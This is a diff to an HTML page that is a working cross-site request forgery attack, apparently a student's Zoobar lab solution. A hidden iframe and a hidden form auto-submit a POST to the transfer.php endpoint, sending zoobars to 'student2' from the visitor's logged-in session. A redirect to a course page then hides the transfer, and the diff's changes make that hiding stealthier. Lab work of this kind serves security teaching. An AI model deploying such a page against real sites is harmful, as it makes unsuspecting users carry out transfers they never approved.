@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe width="0" height="0" border="0" name="dummyframe" id="dummyframe"></iframe>
+<iframe style="display:none" name="dummyframe" id="dummyframe"></iframe>
 <form id="myForm" name="myForm" action="http://dasak.csc.kth.se/zoobar/transfer.php" method="POST" target="dummyframe">
   <input type="hidden" name="zoobars" id="val1" value="1"/>
   <input type="hidden" name="recipient" id="val2" value="student2"/>
   <input type="hidden" name="submission" value="Send">
 </form>
 <script type="text/javascript">
-window.location.href="https://kth.instructure.com/courses/3497"
+window.location.replace("https://kth.instructure.com/courses/3497")
 window.onload = document.getElementById('myForm').submit();
 </script>
 </body>
